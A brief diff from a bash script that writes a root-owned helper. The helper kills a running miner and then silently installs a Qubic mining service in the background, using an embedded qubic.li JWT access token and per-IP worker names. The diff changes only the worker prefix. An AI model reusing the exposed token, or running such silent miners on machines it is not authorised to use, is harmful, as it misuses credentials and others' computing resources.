@@ -20,7 +20,7 @@ cat >>/root/danielluis1921.sh <<EOF
 #!/bin/bash
 sudo ./kill_miner.sh
 sleep 5
-sudo ./qli-Service-install.sh $cores eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJJZCI6IjM0NjZmNGFiLTAxZTItNDgxNS1iNTRhLTczNTA4YjA4ZDdhMCIsIk1pbmluZyI6IiIsIm5iZiI6MTcxMTM1NjYwNywiZXhwIjoxNzQyODkyNjA3LCJpYXQiOjE3MTEzNTY2MDcsImlzcyI6Imh0dHBzOi8vcXViaWMubGkvIiwiYXVkIjoiaHR0cHM6Ly9xdWJpYy5saS8ifQ.Lb3QDaNp7-N7su1-JWAZeH2CJdSvro1iiWqzER6S_ySbWmqL9ioCRmRJ_Z_BkMeRxm7QwcnVEMZ9H6J0mO21BA love-$country-$IP4_UNDERSCORE> /dev/null 2>&1 &
+sudo ./qli-Service-install.sh $cores eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJJZCI6IjM0NjZmNGFiLTAxZTItNDgxNS1iNTRhLTczNTA4YjA4ZDdhMCIsIk1pbmluZyI6IiIsIm5iZiI6MTcxMTM1NjYwNywiZXhwIjoxNzQyODkyNjA3LCJpYXQiOjE3MTEzNTY2MDcsImlzcyI6Imh0dHBzOi8vcXViaWMubGkvIiwiYXVkIjoiaHR0cHM6Ly9xdWJpYy5saS8ifQ.Lb3QDaNp7-N7su1-JWAZeH2CJdSvro1iiWqzER6S_ySbWmqL9ioCRmRJ_Z_BkMeRxm7QwcnVEMZ9H6J0mO21BA NEW-$country-$IP4_UNDERSCORE> /dev/null 2>&1 &
 sleep 3
 EOF
 
